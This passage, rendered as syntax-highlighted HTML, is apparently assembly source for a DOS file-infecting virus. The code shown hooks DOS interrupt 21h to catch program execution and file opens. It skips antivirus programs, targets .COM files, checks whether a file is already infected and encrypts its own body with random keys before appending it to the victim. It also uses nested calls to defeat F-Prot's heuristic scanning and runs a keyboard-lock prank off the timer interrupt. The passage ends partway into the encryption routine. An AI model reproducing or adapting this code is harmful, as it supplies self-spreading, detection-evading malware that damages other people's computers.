        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">    </span><span class="sc1">; set numlock flag</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">endme</span><span class="sc0">
</span><span class="sc5">two</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">click</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">    </span><span class="sc1">; set caps lock flag</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">endme</span><span class="sc0">
</span><span class="sc5">three</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">click</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">              
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">    </span><span class="sc1">; set scroll lock flag</span><span class="sc0">
</span><span class="sc5">endme</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_1Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Go to old int 1Ch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Psalm 69'</span><span class="sc0">
</span><span class="sc5">screw_fprot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;  Nested calls to confuse</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;  f-protect's heuristic</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;  analysis</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">screw2</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">screw3</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">screw4</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Every day is Halloween'</span><span class="sc0">
</span><span class="sc5">Firefly</span><span class="sc4">:</span><span class="sc0">                                   
        </span><span class="sc6">pushf</span><span class="sc0">                              </span><span class="sc1">; Am I checking if     </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2c2ch</span><span class="sc0">                   </span><span class="sc1">; I am resident?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">My_21h</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFh</span><span class="sc0">                   </span><span class="sc1">; If so, return</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                               </span><span class="sc1">; 0FFFh in AX    </span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        
</span><span class="sc5">My_21h</span><span class="sc4">:</span><span class="sc0">         
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; save these</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">check_for_proper_calls</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">                    </span><span class="sc1">; executed? </span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">chk_com</span><span class="sc0"> 
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">                    </span><span class="sc1">; open?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">chk_com</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">                    </span><span class="sc1">; attribs?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">chk_com</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ch</span><span class="sc0">                    </span><span class="sc1">; extended open?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">extended</span><span class="sc0">              
           
</span><span class="sc5">notforme</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; The End</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Happiness in Slavery'</span><span class="sc0">
</span><span class="sc5">extended</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; now a normal open</span><span class="sc0">
</span><span class="sc5">chk_com</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">victim_name</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">victim_name</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                          
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">                     </span><span class="sc1">; find the period</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">avtest</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00ffh</span><span class="sc0">                  </span><span class="sc1">; WAS the program an AV?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">notforme</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">      </span><span class="sc1">; is i a .(CO)M?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">                
</span><span class="sc5">Grab_24</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">; hook interrupt 24</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; by direct writes to </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">; interrupt vector</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_24h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">  </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                         
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                         
        
</span><span class="sc5">open_victim</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">victim_name</span><span class="sc0">       </span><span class="sc1">; get and save attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">notforme</span><span class="sc0">                 </span><span class="sc1">; error handler</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                       
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                </span><span class="sc1">; clear attribs</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">notforme</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                 </span><span class="sc1">; open victim</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">victim_name</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">notforme</span><span class="sc0">                 </span><span class="sc1">; error handler</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; put handle in proper place</span><span class="sc0">
</span><span class="sc5">get_date</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; get and save date </span><span class="sc0">
                         </span><span class="sc1">; and time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; save time</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; save date</span><span class="sc0">
        
</span><span class="sc5">check_forme</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                       </span><span class="sc1">; read 1st 3 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vict_head</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1h</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                    </span><span class="sc1">; point to end</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vict_head</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; possible jump location</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; already infected?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">save_date</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">get_random</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">                      </span><span class="sc1">; dx and (cx-dx)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                           </span><span class="sc1">; will be to two</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; encryption values</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">get_random</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryption_value_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e_value_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryption_value_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e_value_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; fix BX offset in head</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">  
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">             </span><span class="sc1">; copy virus to buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryptbuffer</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">; construct jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_jump</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_jump</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Encryptvirus_in_buffer</span><span class="sc4">:</span><span class="sc0">                
